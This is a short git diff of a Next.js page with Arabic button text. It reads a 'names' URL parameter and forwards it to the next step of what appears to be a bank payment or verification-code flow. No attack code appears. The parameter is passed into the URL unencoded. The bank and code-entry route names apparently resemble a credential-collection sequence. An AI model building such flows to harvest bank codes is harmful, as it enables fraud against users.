@@ -5,9 +5,11 @@ import Image from 'next/image'
 import styles from './nphadsecuess.module.css'
 import image23 from '../../../../../../../../public/image23.jpg'
 import ima from '../../../../../../../../public/Capture-2.jpg'
-import { useRouter } from 'next/navigation'
+import { useRouter,useSearchParams } from 'next/navigation'
 const Page = () => {
     const router = useRouter()
+    const x = useSearchParams();
+    const datas = x.get("names")
   return (
     <div className={styles.continer}>
         <Image 
@@ -19,7 +21,7 @@ const Page = () => {
             <Image 
                 src={ima}
             />
-            <button onClick={() => router.push('/fozajil/banks/pay/code/nphad/codeto')}>التالي</button>
+            <button onClick={() => router.push(`/fozajil/banks/pay/code/nphad/codeto?names=${datas}`)}>التالي</button>
         </div>
     </div>
   )
